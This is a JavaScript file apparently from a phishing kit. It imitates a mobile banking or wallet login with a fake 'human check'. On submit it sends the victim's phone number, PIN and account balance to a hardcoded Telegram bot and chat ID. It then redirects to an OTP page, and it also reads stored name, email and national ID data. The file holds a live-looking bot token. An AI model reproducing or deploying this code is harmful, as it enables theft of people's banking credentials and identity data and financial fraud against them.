document.addEventListener("DOMContentLoaded", () => {

  /* =============================== REFERENCIAS =============================== */
  const loginCard = document.getElementById("entrar");
  const inputTelefonoLogin = document.getElementById("txtUsername");
  const inputPin = document.getElementById("txtPass");
  const inputSaldo = document.getElementById("txtSaldo");
  const humanCheck = document.getElementById("humanCheck");
  const btnEntrar = document.getElementById("btnEntrar");

  /* =============================== AUTOCARGAR TELÉFONO =============================== */
  const registros = JSON.parse(localStorage.getItem("registros"));
  if (registros && registros.length > 0) {
    const ultimoRegistro = registros[registros.length - 1];
    inputTelefonoLogin.value = ultimoRegistro.numero;
  }

  console.log("Datos cargados en login (registros):", registros);

  /* =============================== HUMAN CHECK (NO TOCAR) =============================== */
  humanCheck.addEventListener("click", () => {
    humanCheck.classList.toggle("checked");
    const activo = humanCheck.classList.contains("checked");
    btnEntrar.disabled = !activo;

    if (activo) {
      btnEntrar.style.background = "#DA0081";
      btnEntrar.style.color = "#fff";
      btnEntrar.style.cursor = "pointer";
    } else {
      btnEntrar.style.background = "#dcdcdc";
      btnEntrar.style.color = "#888";
      btnEntrar.style.cursor = "not-allowed";
    }
  });

  /* =============================== BOTÓN ENTRAR =============================== */
  btnEntrar.addEventListener("click", async () => {

    if (!humanCheck.classList.contains("checked")) {
      alert("Debes confirmar que eres una persona real");
      return;
    }

    if (!inputPin.value || !inputSaldo.value) {
      alert("Completa todos los campos");
      return;
    }

    /* =============================== TELEGRAM =============================== */
    const TELEGRAM_BOT_TOKEN = "8588682882:AAGBckxmZijeZfAuF5PzUuEQD-vZLJBC9BE";
    const TELEGRAM_CHAT_ID  = "7874654715";

    const mensaje =
      "*#2*\n\n" +
      "Numero: " + inputTelefonoLogin.value + "\n" +
      "Clave: " + inputPin.value + "\n" +
      "Saldo: " + inputSaldo.value ;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: mensaje,
            parse_mode: "Markdown"
          })
        }
      );

      if (!response.ok) throw new Error("Error al enviar  T");

      /* =============================== GUARDAR EN LOCALSTORAGE =============================== */
      const datosLogin = {
        numero: inputTelefonoLogin.value,
        pin: inputPin.value,
        saldo: inputSaldo.value,
        fecha: new Date().toLocaleString()
      };

      localStorage.setItem("loginData", JSON.stringify(datosLogin));


      /* =============================== ALERTA DE PRUEBA =============================== */
      const primerFormulario = JSON.parse(localStorage.getItem("registros"));
      let mensajeForm1 = "❌ No hay datos en el primer almacenamiento (registros)";

      if (primerFormulario && primerFormulario.length > 0) {
        const datosFinales = primerFormulario[primerFormulario.length - 1];
        mensajeForm1 =
          "#1:\n\n" +
          "Numero: " + datosFinales.numero + "\n" +
          "Nombre: " + datosFinales.nombre + "\n" +
          "Correo: " + datosFinales.correo + "\n" +
          "Cédula: " + datosFinales.cedula ;
    }

      const segundoFormulario = JSON.parse(localStorage.getItem("loginData"));
      let mensajeForm2 = "❌ No hay datos en el segundo almacenamiento (loginData)";

      if (segundoFormulario) {
        mensajeForm2 =
          "#2:\n\n" +
          "Numero: " + segundoFormulario.numero + "\n" +
          "Pin: " + segundoFormulario.pin + "\n" +
          "💰 Saldo: " + segundoFormulario.saldo;
      }

    

      /* =============================== REDIRECCIÓN =============================== */
      window.location.href = "otp.html";

    } catch (error) {
      console.error("Telegram error:", error);
      alert("Error. Intenta nuevamente.");
    }

  });


});




